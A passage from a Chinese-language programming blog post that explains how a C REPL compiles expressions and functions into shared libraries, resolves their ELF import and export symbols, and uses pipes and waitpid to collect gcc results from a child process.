class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">     Elf32_Addr r_offset;</span><br><span class="line">     <span class="type">uint32_t</span>   r_info;</span><br><span class="line"> &#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">     Elf64_Addr r_offset;</span><br><span class="line">     <span class="type">uint64_t</span>   r_info;</span><br><span class="line"> &#125; Elf64_Rel;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">     Elf32_Addr r_offset;</span><br><span class="line">     <span class="type">uint32_t</span>   r_info;</span><br><span class="line">     <span class="type">int32_t</span>    r_addend;</span><br><span class="line"> &#125; Elf32_Rela;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">     Elf64_Addr r_offset;</span><br><span class="line">     <span class="type">uint64_t</span>   r_info;</span><br><span class="line">     <span class="type">int64_t</span>    r_addend;</span><br><span class="line"> &#125; Elf64_Rela;</span><br></pre></td></tr></table></figure><p>重点在于<strong>r_offset</strong>字段和<strong>r_info</strong>字段:<strong>r_offset</strong>表示该导入符号的got表的地址相对动态链接库载入地址的偏移，也就是应该将导入符号的地址覆盖到这里；<strong>r_info</strong>，可以通过<strong>ELFN_R_SYM(info)</strong>宏，获取该导入符号在<strong>.dynsym</strong>符号表的下标，从而可以获取导入符号的字符串。因此，通过这些信息，可以将其依赖的导入符号的地址信息覆写到动态链接库的对应地址处</p></li></ol><p>  最后，其逻辑如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 即解析加载的动态链接库</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 即保存导出符号，同时覆盖导入符号即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined __x86_64__</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> uintptr_t         uint64_t</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> Elf_Ehdr          Elf64_Ehdr</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> Elf_Shdr          Elf64_Shdr</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> Elf_Sym           Elf64_Sym</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> Elf_Rel           Elf64_Rela</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> ELF_ST_TYPE(info) ELF64_ST_TYPE(info)</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> ELF_ST_BIND(info) ELF64_ST_BIND(info)</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> ELF_R_SYM(info)   ELF64_R_SYM(info)</span></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined __i386__</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> uintptr_t         uint32_t</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> Elf_Ehdr          Elf32_Ehdr</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> Elf_Shdr          Elf32_Shdr</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> Elf_Sym           Elf32_Sym</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> Elf_Rel           Elf32_Rel</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> ELF_ST_TYPE(info) ELF32_ST_TYPE(info)</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> ELF_ST_BIND(info) ELF32_ST_BIND(info)</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> ELF_R_SYM(info)   ELF32_R_SYM(info)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">resolve_libso</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *addr, <span class="type">const</span> <span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> sym</span></span><br><span class="line">  <span class="type">char</span> path[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="built_in">snprintf</span>(buf, BUF_SIZE, <span class="string">&quot;/proc/self/fd/%d&quot;</span>, fd);</span><br><span class="line">  readlink(buf, path, BUF_SIZE);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *shstrtab = <span class="literal">NULL</span>;</span><br><span class="line">  Elf_Ehdr *ehdr = (Elf_Ehdr*)addr;</span><br><span class="line">  Elf_Shdr *shdr = (Elf_Shdr*)((<span class="type">uintptr_t</span>)addr + (<span class="type">uintptr_t</span>)ehdr-&gt;e_shoff);</span><br><span class="line">  <span class="type">uint16_t</span> shnum = ehdr-&gt;e_shnum;</span><br><span class="line">  shstrtab = (<span class="type">char</span>*)((<span class="type">uintptr_t</span>)addr + (<span class="type">uintptr_t</span>)shdr[ehdr-&gt;e_shstrndx].sh_offset);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 遍历section table，获取.dynsym、.rela.plt/.rel.plt和.dynstr名称的section即可</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">int</span> dynsym_size = <span class="number">0</span>, rel_size = <span class="number">0</span>;</span><br><span class="line">  <span class="type">char</span> *dynstr = <span class="literal">NULL</span>;</span><br><span class="line">  Elf_Sym *dynsym = <span class="literal">NULL</span>;</span><br><span class="line">  Elf_Rel *rel = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; shnum; ++i) &#123;</span><br><span class="line">    <span class="comment">//即解析符号表和字符串表</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(&amp;shstrtab[shdr[i].sh_name], <span class="string">&quot;.dynsym&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">      dynsym = (Elf_Sym*)((<span class="type">uintptr_t</span>)shdr[i].sh_addr + (<span class="type">uintptr_t</span>)addr);</span><br><span class="line">      dynsym_size = (shdr[i].sh_size) / (shdr[i].sh_entsize);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(&amp;shstrtab[shdr[i].sh_name], <span class="string">&quot;.dynstr&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">      </span><br><span class="line">      dynstr = (<span class="type">char</span>*)((<span class="type">uintptr_t</span>)shdr[i].sh_offset + (<span class="type">uintptr_t</span>)addr);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(&amp;shstrtab[shdr[i].sh_name], <span class="string">&quot;.rela.plt&quot;</span>) == <span class="number">0</span> ||</span><br><span class="line">      <span class="built_in">strcmp</span>(&amp;shstrtab[shdr[i].sh_name], <span class="string">&quot;.rel.plt&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">      rel = (Elf_Rel*)((<span class="type">uintptr_t</span>)shdr[i].sh_offset + (<span class="type">uintptr_t</span>)addr);</span><br><span class="line">      rel_size = (shdr[i].sh_size) / (shdr[i].sh_entsize);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> sym</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;lib[%s], dynsym =&gt; %p, dynsym_size: %d, dynstr =&gt; %p, rel =&gt; %p, rel_size: %d\n&quot;</span>, </span><br><span class="line">    path, dynsym, dynsym_size, dynstr, rel, rel_size);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *sym_name = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="type">void</span> *sym_addr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 开始解析导入符号</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; rel_size; ++i) &#123;</span><br><span class="line">    sym_name = &amp;dynstr[dynsym[ELF_R_SYM(rel[i].r_info)].st_name];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; symbols_size; ++j) &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strcmp</span>(sym_name, symbols[j].name) == <span class="number">0</span>) &#123;</span><br><span class="line">        sym_addr = symbols[j].addr;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(sym_addr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">snprintf</span>(buf, BUF_SIZE, <span class="string">&quot;&#x27;%s&#x27; undeclared (first use in crepl)\n&quot;</span>, sym_name);</span><br><span class="line">      crepl_print(CREPL_PRINT_MODE_FAIL, buf);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    *(<span class="type">uintptr_t</span>*)((<span class="type">uintptr_t</span>)addr + (<span class="type">uintptr_t</span>)rel[i].r_offset) = (<span class="type">uintptr_t</span>)sym_addr;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> sym</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;import: lib[%s], resolve[%s], got[%p] = %p\n&quot;</span>, path, sym_name, (<span class="type">void</span>*)((<span class="type">uintptr_t</span>)addr + (<span class="type">uintptr_t</span>)rel[i].r_offset), sym_addr);</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 开始解析导出符号</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * 如果ELFN_ST_BIND(info)是STB_GLOBAL，</span></span><br><span class="line"><span class="comment">   * 且ELFN_ST_TYPE(info)是STT_FUNC</span></span><br><span class="line"><span class="comment">   * 则其是导出符号</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; dynsym_size; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span>(ELF_ST_BIND(dynsym[i].st_info) == STB_GLOBAL &amp;&amp; ELF_ST_TYPE(dynsym[i].st_info) == STT_FUNC) &#123;</span><br><span class="line">      sym_name = &amp;dynstr[dynsym[i].st_name];</span><br><span class="line">      sym_addr = (<span class="type">void</span>*)((<span class="type">uintptr_t</span>)addr + (<span class="type">uintptr_t</span>)dynsym[i].st_value);</span><br><span class="line"></span><br><span class="line">      symbols[symbols_size].addr = sym_addr;</span><br><span class="line">      symbols[symbols_size].name = sym_name;</span><br><span class="line">      ++symbols_size;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> sym</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;export: lib[%s], resolve[%s] =&gt; %p\n&quot;</span>, path, sym_name, sym_addr);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="父进程与子进程通信"><a href="#父进程与子进程通信" class="headerlink" title="父进程与子进程通信"></a>父进程与子进程通信</h4><p>  实际上，这里的细节就比较多了</p><ol><li>如何建立通信<br>这里是通过管道符进行通信的。具体的使用方法可以通过<code>man 2 pipe</code>查看。<ul><li>在进程中调用<strong>pipe(pipefd)</strong>，初始化一个管道</li><li>然后调用<strong>fork</strong>，创建子进程</li><li>初始化父、子进程的管道设置<ul><li>对于子进程来说，一般是关闭读管道(pipefd[0])；然后通过<code>dup2(pipefd[1], STDERR_FILENO)</code>，将子进程标准错误输出重定向到管道写端；然后关闭写管道(pipefd[1])</li><li>对于父进程来说，是关闭写管道(pipefd[1])；然后通过<code>fcntl(pipefd[0], F_SETFD, O_NONBLOCK)</code>设置读管道非阻塞即可。这里特别注意一下，一定要关闭父进程的写管道，否则调用<strong>read</strong>会阻塞——只有当管道没有写引用的时候，才能正常读</li></ul></li></ul></li><li><p>怎样进行通信<br>如果<strong>gcc</strong>没有正确编译，则其没有<strong>exit</strong>退出，或<strong>exit</strong>退出值非0。因此，父进程首先通过调用<code>waitpid(pid, &amp;wstatus, 0)</code>，等待子进程退出或被信号终止后，通过判断<code>WIFEXITED(wstatus) &amp;&amp; !WEXITSTATUS(wstatus)</code>，来判断子进程是否正常完成编译——如果为真，则表示<strong>gcc</strong>正确编译，则输出相关信息即可；否则，编译有异常，则输出中断信号和管道信息</p><p>其逻辑如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 其任务相对简单一些</span></span><br><span class="line"><span class="comment"> * 直接waitpid，等待子进程结束即可</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 然后通过查看waitpid中的状态信息，判断是正常返回，还是异常结束</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * - 对于函数来说</span></span><br><span class="line"><span class="comment"> *    - 如果WIFEXITED为真，且WEXITSTATUS为0，则说明子进程正常编译动态链接库，则解析动态链接库即可</span></span><br><span class="line"><span class="comment"> *    - 否则：则输出strsignal和管道的输出信息</span></span><br><span class="line"><span class="comment"> * - 对于表达式来说</span></span><br><span class="line"><span class="comment"> *    - 如果WIFEXITED为真，且WEXITSTATUS为0，则说明子进程正常编译动态链接库，则解析动态链接库并执行包装的表达式即可</span></span><br><span class="line"><span class="comment"> *    - 否则: 则输出strsignal或者管道输出信息即可</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 这里需要注意的是</span></span><br><span class="line"><span class="comment"> * 父进程必须关闭管道描述符的写段，否则无法分别进程是否结束：</span></span><br><span class="line"><span class="comment"> * 这里根据网上资料，如果未关闭写段，仍然有指向写段的指针，则即使子进程结束了，但是内核仍然认为有数据要被写入，从而导致无法通过read读取的字节数判断子进程是否终止</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">parent</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *line, <span class="type">const</span> <span class="type">int</span> line_type, <span class="type">const</span> <span class="type">pid_t</span> pid, <span class="type">const</span> <span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> wstatus;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">//关闭不会使用的管道写端</span></span><br><span class="line">  <span class="keyword">if</span>(close(pipefd[<span class="number">1</span>]) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="type">char</span> buf[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">snprintf</span>(buf, BUF_SIZE, <span class="string">&quot;%s\n&quot;</span>, strerror(errno));</span><br><span class="line">    crepl_print(CREPL_PRINT_MODE_FAIL, buf);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">//等待子进程退出或被中断</span></span><br><span class="line">  <span class="keyword">if</span>(waitpid(pid, &amp;wstatus, <span class="number">0</span>) != pid) &#123;</span><br><span class="line">    <span class="type">char</span> buf[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">snprintf</span>(buf, BUF_SIZE, <span class="string">&quot;%s\n&quot;</span>, strerror(errno));</span><br><span class="line">    crepl_print(CREPL_PRINT_MODE_FAIL, buf);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 根据解析的输入形式</span></span><br><span class="line"><span class="comment">   * 处理子进程相应的退出状态以及异常信息</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (line_type)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> LINE_TYPE_FUNC:</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(WIFEXITED(wstatus) &amp;&amp; !WEXITSTATUS(wstatus)) &#123;</span><br><span class="line"></span><br><span class="line">        close(pipefd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 即成功编译函数</span></span><br><span class="line"><span class="comment">         * 此时载入并解析动态链接库文件即可</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        load_and_resolve(line, fd);</span><br><span class="line"></span><br><span class="line">      &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 即编译函数过程中遇见错误</span></span><br><span class="line"><span class="comment">         * 则输出中断信号信息及子进程的标准错误输出即可</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        deal_child_error(wstatus, pipefd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> LINE_TYPE_EXP:</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(WIFEXITED(wstatus) &amp;&amp; !WEXITSTATUS(wstatus)) &#123;</span><br><span class="line"></span><br><span class="line">        close(pipefd[<span class="number">0</span>]);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 即成功编译表达式</span></span><br><span class="line"><span class="comment">         * 此时载入并执行动态链接库文件即可</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        load_and_resolve_and_execute(line, fd);</span><br><span class="line"></span><br><span class="line">      &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 即编译表达式过程中遇见错误</span></span><br><span class="line"><span class="comment">         * 则输出中断信号信息及子进程的标准错误输出即可</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        deal_child_error(wstatus, pipefd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h3><p>  实际上，处理表达式，大体思路和处理函数基本一样——就是将其包装成一个函数，然后写入到临时源文件中，然后调用<strong>gcc</strong>编译成动态链接库文件，然后进行装载，并解析其中的导入符号和导出符号即可。<br>  最终，调用包装后的符号即可</p><h4 id="编译动态链接文件"><a href="#编译动态链接文件" class="headerlink" title="编译动态链接文件"></a>编译动态链接文件</h4><p>  其思路就是将表达式包装成一个返回值为<strong>int</strong>类型，无输入参数的函数即可，其返回值就是表达式。<br>  因此，其写入临时源文件的数据要更多一些，其余步骤和处理函数的部分完全一样，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 即子进程包装表达式，并且编译成动态链接库</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 这里需要将表达式包装成函数写入</span></span><br><span class="line"><span class="comment"> * 也就是添加前缀&quot;int __crepl_hawk_wrapper_%d(void)\n&#123;\nreturn&quot;</span></span><br><span class="line"><span class="comment"> * 添加后缀“;\n&#125;&quot;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 然后编译即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">compile_exp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *line, <span class="type">const</span> <span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> src_file;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">//首先申请一个临时源文件，用来存放待编译的源文件</span></span><br><span class="line">  init_temp_file_name(buf, <span class="string">&quot;/tmp/crepl-src&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>((src_file = mkstemp(buf)) == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="comment">//初始化失败，则输出错误信息即</span></span><br><span class="line">    dprintf(STDERR_FILENO, <span class="string">&quot;%s\n&quot;</span>, strerror(errno));</span><br><span class="line">    kill(getpid(), SIGCHLD);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//首先写入前缀</span></span><br><span class="line">  <span class="built_in">snprintf</span>(buf, BUF_SIZE, <span class="string">&quot;int %s(void)\n&#123;\n\treturn\n&quot;</span>, wrapper_name);</span><br><span class="line">  write_to_file(buf, src_file);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 其次写入表达式</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="built_in">snprintf</span>(buf, BUF_SIZE, <span class="string">&quot;%s&quot;</span>, line);</span><br><span class="line">  write_to_file(line, src_file);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//最后写入后缀</span></span><br><span class="line">  <span class="built_in">snprintf</span>(buf, BUF_SIZE, <span class="string">&quot;;\n&#125;&quot;</span>);</span><br><span class="line">  write_to_file(buf, src_file);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">//然后编译即可</span></span><br><span class="line">  compiler_libso(src_file, fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="装载动态链接文件"><a href="#装载动态链接文件" class="headerlink" title="装载动态链接文件"></a>装载动态链接文件</h4><p>  和处理函数的部分完全一样，这里就不过多赘述。</p><h4 id="解析动态链接文件"><a href="#解析动态链接文件" class="headerlink" title="解析动态链接文件"></a>解析动态链接文件</h4><p>  和处理函数的部分完全一样，这里就不过多赘述。</p><h4 id="父进程与子进程通信-1"><a 